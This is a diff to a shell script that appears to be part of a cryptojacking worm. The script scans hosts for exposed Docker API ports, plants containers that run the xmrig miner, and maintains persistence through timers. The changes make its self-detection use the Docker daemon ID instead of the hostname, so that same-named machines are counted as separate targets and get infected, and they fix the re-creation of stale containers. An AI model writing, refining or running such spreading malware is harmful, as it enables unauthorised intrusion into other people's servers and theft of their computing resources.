@@ -37,7 +37,13 @@ MAX="${E_MAX:-${DOCK_MAX_HOSTS:-120}}"      # hosts scanned per run
 PAR="${E_PAR:-${DOCK_PAR:-20}}"             # concurrent probes
 RETRY="${DOCK_RETRY:-604800}"     # rescAN a dead host after 7d
 PORTS="${DOCK_PORTS:-2375 2376 4243}"
-SKIPSELF="${E_SELF:-${DOCK_SKIP_SELF:-yes}}"   # don't stack a container on our own daemon
+SKIPSELF="${E_SELF:-${DOCK_SKIP_SELF:-yes}}"
+# Our own daemon's identity: "is this host ourselves?" must not be answered by
+# hostname - boxes off one image share one (see the self-check in dock_one).
+MYID=$(curl -sS -m 4 --unix-socket /var/run/docker.sock http://localhost/info 2>/dev/null \
+     | grep -o '"ID":"[^"]*"' | head -1 | cut -d'"' -f4) || MYID=""
+# SKIPSELF above: don't stack a container on our own daemon.
+[ -n "${MYID:-}" ] || MYID=""
 # ---- self-healing cadence ---------------------------------------------------
 # Our timer shipped with a 6h period, which throttled the whole vector. The
 # updater rewrites unit files but never their intervals, so enforce it here too:
@@ -164,13 +170,21 @@ dock_one() {
     # if this daemon is the very box we are running on, the ssh payload already
     # mines here - a second xmrig would just buy a second randomx dataset. Only
     # an existing container of ours is worth touching (handled above).
+    # Identity is the daemon ID, not the hostname: a shared hostname is a DIFFERENT
+    # machine and worth infecting. And this test must only *decide* - it used to
+    # return here, before the container check, so a same-named host's stale container
+    # was never re-created.
+    selfbox=0
     if [ "$SKIPSELF" = yes ]; then
         me=$(hostname 2>/dev/null) || me=""
         nm=$(curl -fsS $opts --max-time 4 "$b/info" 2>/dev/null \
              | grep -o '"Name": *"[^"]*"' | head -1 | cut -d'"' -f4)
-        if [ -n "$me" ] && [ "$nm" = "$me" ]; then
-            echo "dock: $ip is this host (payload mines here already)"
-            return 0
+        rid=$(curl -fsS $opts --max-time 4 "$b/info" 2>/dev/null \
+             | grep -o '"ID":"[^"]*"' | head -1 | cut -d'"' -f4)
+        if [ -n "${rid:-}" ] && [ -n "${MYID:-}" ]; then
+            [ "$rid" = "$MYID" ] && selfbox=1
+        elif [ -n "$me" ] && [ -n "${nm:-}" ] && [ "$nm" = "$me" ]; then
+            selfbox=1
         fi
     fi
 
@@ -217,6 +231,13 @@ dock_one() {
             echo "dock: $ip started our existing container ($have)"
         fi
         printf '%s\t%s\n' "$ip" "existing" >> "$OWNFILE"
+        return 0
+    fi
+
+    # only now apply the self-decision: a host that IS this box but holds a stale
+    # container of ours still needs the re-create (handled above).
+    if [ "${selfbox:-0}" = 1 ]; then
+        echo "dock: $ip is this host (payload mines here already)"
         return 0
     fi
 
